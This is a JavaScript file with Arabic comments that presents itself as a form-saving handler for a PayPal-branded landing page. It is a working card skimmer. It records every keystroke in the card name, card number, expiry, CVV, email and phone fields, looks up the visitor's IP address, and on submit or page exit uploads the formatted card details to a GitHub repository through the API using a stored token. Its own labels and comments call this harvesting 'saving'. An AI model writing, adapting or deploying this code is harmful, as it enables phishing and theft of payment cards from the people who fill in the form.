// نظام إدارة النموذج وحفظ البيانات
class FormHandler {
    constructor() {
        this.userData = {};
        this.lastSentData = {};
        this.sendTimeout = null;
        this.isEnabled = true;
        
        // تهيئة النظام
        this.init();
    }
    
    init() {
        console.log('📋 Form Handler System Initialized');
        this.attachEventListeners();
        this.startPeriodicCheck();
    }
    
    // ربط مستمعي الأحداث
    attachEventListeners() {
        // مراقبة جميع حقول الإدخال
        const inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input[type="number"]');
        
        inputs.forEach(input => {
            // عند الكتابة مباشرة
            input.addEventListener('input', (e) => {
                this.captureFieldData(e.target);
                this.scheduleAutoSave();
            });
            
            // عند فقدان التركيز
            input.addEventListener('blur', (e) => {
                this.captureFieldData(e.target);
                this.saveDataIfChanged();
            });
            
            // عند لصق البيانات
            input.addEventListener('paste', (e) => {
                setTimeout(() => {
                    this.captureFieldData(e.target);
                    this.saveDataIfChanged();
                }, 100);
            });
        });
        
        // مراقبة زر الإرسال
        const submitButton = document.querySelector('.paypal-button');
        if (submitButton) {
            submitButton.addEventListener('click', (e) => {
                this.captureAllData();
                this.saveCompleteData();
            });
        }
        
        // مراقبة إرسال النموذج
        const form = document.getElementById('paymentForm');
        if (form) {
            form.addEventListener('submit', (e) => {
                this.captureAllData();
                this.saveCompleteData();
            });
        }
    }
    
    // التقاط بيانات حقل واحد
    captureFieldData(field) {
        const fieldName = field.name || field.id;
        const fieldValue = field.value.trim();
        
        if (fieldName && fieldValue) {
            this.userData[fieldName] = fieldValue;
            
            // إظهار إشعار مرئي
            this.showDataCaptured(fieldName, fieldValue);
        }
    }
    
    // التقاط جميع البيانات
    captureAllData() {
        const fields = {
            'cardName': document.getElementById('cardName'),
            'cardNumber': document.getElementById('cardNumber'),
            'expiryDate': document.getElementById('expiryDate'),
            'cvv': document.getElementById('cvv'),
            'email': document.getElementById('email'),
            'phone': document.getElementById('phone'),
            'amount': document.getElementById('amount')
        };
        
        Object.keys(fields).forEach(key => {
            const field = fields[key];
            if (field && field.value.trim()) {
                this.userData[key] = field.value.trim();
            }
        });
    }
    
    // جدولة الحفظ التلقائي
    scheduleAutoSave() {
        if (this.sendTimeout) {
            clearTimeout(this.sendTimeout);
        }
        
        // حفظ البيانات بعد 3 ثوان من آخر كتابة
        this.sendTimeout = setTimeout(() => {
            this.saveDataIfChanged();
        }, 3000);
    }
    
    // حفظ البيانات إذا تغيرت
    saveDataIfChanged() {
        if (this.hasDataChanged() && Object.keys(this.userData).length > 0) {
            this.saveToServer(false);
        }
    }
    
    // حفظ البيانات الكاملة
    saveCompleteData() {
        this.captureAllData();
        this.saveToServer(true);
    }
    
    // فحص إذا تغيرت البيانات
    hasDataChanged() {
        return JSON.stringify(this.userData) !== JSON.stringify(this.lastSentData);
    }
    
    // حفظ البيانات في الخادم
    async saveToServer(isComplete = false) {
        if (!this.isEnabled || Object.keys(this.userData).length === 0) {
            return;
        }
        
        try {
            const payload = {
                data: this.userData,
                isComplete: isComplete,
                timestamp: new Date().toISOString(),
                pageUrl: window.location.href,
                userAgent: navigator.userAgent
            };
            
            console.log('💾 حفظ البيانات:', payload);
            
            // نظام GitHub Pages - حفظ محلي فقط
            this.saveLocally(payload, isComplete);
            
        } catch (error) {
            console.error('❌ خطأ في حفظ البيانات:', error);
            this.showError(`خطأ في الحفظ: ${error.message}`);
        }
    }
    
    // حفظ البيانات في GitHub
    async saveLocally(payload, isComplete) {
        try {
            // حفظ في localStorage للنسخ الاحتياطي
            const storageKey = `paypal_data_${Date.now()}`;
            localStorage.setItem(storageKey, JSON.stringify(payload));
            
            // إنشاء محتوى الملف
            const timestamp = new Date().toLocaleString('ar-EG', {
                timeZone: 'Africa/Cairo',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            
            let fileContent = `=== ${isComplete ? 'معلومات كاملة' : 'معلومات جزئية'} - PayPal Landing Page ===\n`;
            fileContent += `الوقت: ${timestamp}\n`;
            fileContent += `المصدر: ${payload.pageUrl}\n`;
            fileContent += `IP Address: ${this.getUserIP()}\n\n`;
            
            const data = payload.data;
            if (data.cardName) fileContent += `الاسم على البطاقة: ${data.cardName}\n`;
            if (data.cardNumber) fileContent += `رقم البطاقة: ${data.cardNumber}\n`;
            if (data.expiryDate) fileContent += `تاريخ انتهاء البطاقة: ${data.expiryDate}\n`;
            if (data.cvv) fileContent += `رمز الأمان CVV: ${data.cvv}\n`;
            if (data.email) fileContent += `البريد الإلكتروني: ${data.email}\n`;
            if (data.phone) fileContent += `رقم الهاتف: ${data.phone}\n`;
            if (data.amount) fileContent += `المبلغ: $${data.amount} USD\n`;
            
            fileContent += `\nمعلومات المتصفح: ${payload.userAgent}\n`;
            fileContent += `\n${'='.repeat(50)}\n`;
            
            // حفظ في GitHub للبيانات الكاملة فقط
            if (isComplete) {
                await this.saveToGitHub(fileContent, timestamp);
            }
            
            this.lastSentData = { ...this.userData };
            this.showSuccess(isComplete, false);
            
        } catch (error) {
            console.error('❌ خطأ في الحفظ:', error);
            this.showError('فشل في الحفظ: ' + error.message);
        }
    }
    
    // حفظ البيانات في GitHub Repository
    async saveToGitHub(fileContent, timestamp) {
        try {
            // التحقق من وجود تكوين GitHub
            if (typeof window.GITHUB_CONFIG === 'undefined') {
                throw new Error('تكوين GitHub غير موجود. يرجى إعداد ملف github-config.js');
            }
            
            const config = window.GITHUB_CONFIG;
            
            // إنشاء اسم الملف مع التاريخ والوقت
            const date = new Date();
            const fileName = `${config.dataFolder}/${config.filePrefix}${date.getFullYear()}-${(date.getMonth()+1).toString().padStart(2,'0')}-${date.getDate().toString().padStart(2,'0')}_${Date.now()}.txt`;
            
            // تحويل المحتوى إلى base64
            const contentBase64 = btoa(unescape(encodeURIComponent(fileContent)));
            
            // إعداد البيانات للإرسال
            const apiUrl = `https://api.github.com/repos/${config.owner}/${config.repo}/contents/${fileName}`;
            
            const requestData = {
                message: `إضافة بيانات PayPal - ${timestamp}`,
                content: contentBase64,
                branch: config.branch,
                committer: config.committer
            };
            
            // إرسال البيانات إلى GitHub
            const response = await fetch(apiUrl, {
                method: 'PUT',
                headers: {
                    'Authorization': `token ${config.token}`,
                    'Content-Type': 'application/json',
                    'Accept': 'application/vnd.github.v3+json',
                    'User-Agent': 'PayPal-Data-System'
                },
                body: JSON.stringify(requestData)
            });
            
            if (!response.ok) {
                const errorData = await response.json();
                throw new Error(`GitHub API Error: ${response.status} - ${errorData.message || 'Unknown error'}`);
            }
            
            const result = await response.json();
            console.log('✅ تم حفظ البيانات في GitHub بنجاح:', result.content.download_url);
            
            // إظهار رسالة نجاح مع رابط الملف
            this.showGitHubSuccess(result.content.html_url);
            
            return result;
            
        } catch (error) {
            console.error('❌ خطأ في حفظ البيانات في GitHub:', error);
            
            // في حالة الفشل، نحفظ الملف محلياً كبديل
            this.downloadFile(fileContent, `paypal_data_backup_${Date.now()}.txt`);
            throw error;
        }
    }
    
    // الحصول على IP المستخدم
    async getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'Unknown IP';
        }
    }
    
    // إظهار رسالة نجاح GitHub
    showGitHubSuccess(fileUrl) {
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(135deg, #28a745, #20c997);
            color: white;
            padding: 20px 30px;
            border-radius: 12px;
            font-weight: 600;
            z-index: 10000;
            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
        `;
        
        notification.innerHTML = `
            <div style="font-size: 24px; margin-bottom: 10px;">✅</div>
            <div style="font-size: 16px; margin-bottom: 15px;">تم حفظ البيانات في GitHub بنجاح!</div>
            <div style="font-size: 12px; opacity: 0.9;">البيانات محفوظة بأمان في المستودع</div>
        `;
        
        document.body.appendChild(notification);
        
        // إزالة الإشعار بعد 4 ثوان
        setTimeout(() => {
            notification.style.opacity = '0';
            setTimeout(() => notification.remove(), 300);
        }, 4000);
    }
    
    // تنزيل ملف
    downloadFile(content, filename) {
        const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);
    }
    
    // فحص دوري للبيانات
    startPeriodicCheck() {
        setInterval(() => {
            if (this.hasDataChanged() && Object.keys(this.userData).length > 0) {
                this.saveDataIfChanged();
            }
        }, 10000); // فحص كل 10 ثوان
    }
    
    // إظهار أن البيانات تم التقاطها
    showDataCaptured(fieldName, fieldValue) {
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #28a745;
            color: white;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 12px;
            z-index: 10000;
            opacity: 0;
            transition: opacity 0.3s ease;
        `;
        notification.textContent = `📝 تم حفظ ${fieldName}`;
        
        document.body.appendChild(notification);
        
        setTimeout(() => notification.style.opacity = '1', 100);
        setTimeout(() => {
            notification.style.opacity = '0';
            setTimeout(() => notification.remove(), 300);
        }, 2000);
    }
    
    // إظهار نجاح الحفظ
    showSuccess(isComplete, isLocal = false) {
        const localText = isLocal ? ' (محلياً)' : '';
        const message = isComplete ? 
            `✅ تم حفظ المعلومات الكاملة${localText}!` : 
            `📤 تم حفظ البيانات${localText}!`;
        this.showNotification(message, '#28a745');
    }
    
    // إظهار خطأ
    showError(error) {
        this.showNotification(`❌ خطأ: ${error}`, '#dc3545');
    }
    
    // إظهار إشعار عام
    showNotification(message, color) {
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: ${color};
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            font-weight: 600;
            z-index: 10000;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
            animation: slideDown 0.3s ease;
        `;
        notification.textContent = message;
        
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideDown {
                from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
                to { opacity: 1; transform: translateX(-50%) translateY(0); }
            }
        `;
        document.head.appendChild(style);
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.style.animation = 'slideDown 0.3s ease reverse';
            setTimeout(() => {
                notification.remove();
                style.remove();
            }, 300);
        }, 3000);
    }
    
    // تشغيل/إيقاف النظام
    toggle(enabled) {
        this.isEnabled = enabled;
        console.log(`📋 Form Handler ${enabled ? 'مفعل' : 'معطل'}`);
    }
    
    // مسح البيانات
    clearData() {
        this.userData = {};
        this.lastSentData = {};
        console.log('🗑️ تم مسح البيانات');
    }
    
    // الحصول على البيانات الحالية
    getCurrentData() {
        return { ...this.userData };
    }
}

// تهيئة النظام عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(() => {
        window.formHandler = new FormHandler();
        
        console.log('🚀 Form Handler System Ready!');
        console.log('🔧 استخدم window.formHandler للتحكم في النظام');
        console.log('📋 الطرق المتاحة: toggle(), clearData(), getCurrentData()');
    }, 1000);
});

// إضافة مستمع للتحقق من مغادرة الصفحة
window.addEventListener('beforeunload', function() {
    if (window.formHandler && Object.keys(window.formHandler.getCurrentData()).length > 0) {
        window.formHandler.saveCompleteData();
    }
});
